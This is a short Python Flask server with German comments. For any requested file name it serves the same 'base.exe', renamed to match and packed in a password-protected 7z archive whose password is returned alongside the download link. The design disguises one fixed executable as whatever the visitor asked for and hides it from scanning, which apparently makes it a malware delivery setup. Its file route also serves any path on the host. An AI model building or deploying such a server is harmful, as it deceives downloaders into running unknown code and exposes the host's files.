from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import os
import random
import subprocess

app = Flask(__name__)
CORS(app)  # 🚀 erlaubt CORS von überall

@app.route("/download/<path:filename>")
def download(filename):
    # Zufälliges Passwort
    password = str(random.randint(1000, 9999))

    # Dateinamen anpassen (7z statt zip)
    base_name = filename.replace(".zip", "")
    archive_name = f"{base_name}.7z"

    # Hier die echte EXE-Datei einbinden
    exe_source = "base.exe"
    exe_target = f"{base_name}.exe"

    if os.path.exists(exe_source):
        # Kopie unter neuem Namen erstellen
        with open(exe_source, "rb") as src, open(exe_target, "wb") as dst:
            dst.write(src.read())

        # 7z Archiv mit Passwort erzeugen
        subprocess.run([
            "7z", "a", "-p" + password, "-y",
            archive_name, exe_target
        ])

        # temporäre exe löschen
        os.remove(exe_target)

    return jsonify({
        "download_url": f"/getfile/{archive_name}",
        "password": password
    })

@app.route("/getfile/<path:filename>")
def getfile(filename):
    return send_file(filename, as_attachment=True)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
